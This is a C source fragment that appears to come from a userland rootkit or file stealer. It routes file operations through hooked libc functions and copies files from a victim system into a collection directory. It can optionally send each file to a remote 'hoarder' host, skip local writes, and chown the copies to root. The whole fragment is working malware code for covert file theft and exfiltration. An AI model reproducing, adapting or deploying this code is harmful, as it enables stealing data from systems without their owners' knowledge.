#ifdef FALLBACK_FAILED_MAP
void wcfallback(FILE *ofp, const u_long fsize, const char *newpath){
    hook(CFOPEN, CFWRITE, CFREAD);

    FILE *nfp = call(CFOPEN, newpath, "w");
    if(!nfp) return;

    const u_long blksize = getablocksize(fsize);
    size_t n, m;
    do{
        unsigned char *buf = malloc(blksize+1);
        if(!buf) goto nopenope;
        memset(buf, 0, blksize+1);
        n = (size_t)call(CFREAD, buf, 1, blksize, ofp);
        if(n){
            m = (size_t)call(CFWRITE, buf, 1, n, nfp);
            fflush(nfp);
        }else m = 0;
        fflush(ofp);
        bfree(buf, blksize+1);
    }while(n > 0 && n == m);
nopenope:
    fcloser(2, ofp, nfp);
}
#endif

int writecopy(const char *oldpath, char *newpath){
    hook(C__LXSTAT, CCREAT);

    struct stat nstat; // for newpath, should it exist, to check if there's a change in size.
    memset(&nstat, 0, sizeof(struct stat));
    int statr = (long)call(C__LXSTAT, _STAT_VER, newpath, &nstat);
    if(statr < 0 && errno != ENOENT) return 1;

    u_long fsize;
    mode_t mode;
    FILE *ofp = bindup(oldpath, newpath, NULL, &fsize, &mode);
    if(ofp == NULL && errno == ENOENT) return 1;
    else if(ofp == NULL) return -1;

    if(!S_ISREG(mode)){
        fclose(ofp);
        return 1;
    }

    u_short done = statr != -1 && (u_long)nstat.st_size == fsize;
#ifdef HOARDER_HOST
    int sendstatus = hoarder_sendfile(oldpath, fileno(ofp), fsize);
    if(sendstatus > 0
        #ifdef HOARDER_NO_DISK_WRITE
        || sendstatus < 0
        #endif
        ){
        fclose(ofp);
        return 1;
    }
#endif
    if(done){
        fclose(ofp);
        return 1;
    }

#ifdef FILE_MAX_SIZE_BYTES
    if(fsize > FILE_MAX_SIZE_BYTES){
        fclose(ofp);
        return -1;
    }
#endif
#ifdef MAXIMUM_CAPACITY_BYTES
    if(initmvbc() && getnewdirsize(mvbc->interestdir, fsize) > MAXIMUM_CAPACITY_BYTES){
        fclose(ofp);
        return -1;
    }
#endif

    if(tmpup(newpath)){
        fclose(ofp);
        return 1;
    }
    rm(newpath);

    FILE *nfp = call(CFOPEN, newpath, "ab");
    if(nfp == NULL){
        fclose(ofp);
        return -1;
    }

    char *tmppath = pathtmp(newpath);
    if(!tmppath){
        fcloser(2, ofp, nfp);
        return -1;
    }
    if(touchfile(tmppath, 0600) < 0){
        fcloser(2, ofp, nfp);
        clean(tmppath);
        return -1;
    }

    u_char *map = mmap(NULL, fsize, PROT_READ, MAP_PRIVATE, fileno(ofp), 0);
    if(map == MAP_FAILED){
#ifdef FALLBACK_FAILED_MAP
        wcfallback(ofp, fsize, newpath);
        fcloser(2, ofp, nfp);
        return 1;
#else
        fcloser(2, ofp, nfp);
        return -1;
#endif
    }
    fclose(ofp);

    for(u_long i = 0; i < fsize; i++){
        u_char p = map[i];
        fputc(p, nfp);
    }

    fclose(nfp);
    madvise(map, fsize, MADV_DONTNEED);
    munmap(map, fsize);
    rm(tmppath);
    clean(tmppath);

#ifdef KEEP_FILE_MODE
    hook(CCHMOD);
    call(CCHMOD, newpath, mode);
#endif

    if(!notuser(0))
        chownpath(newpath, 0);
    return 1;
}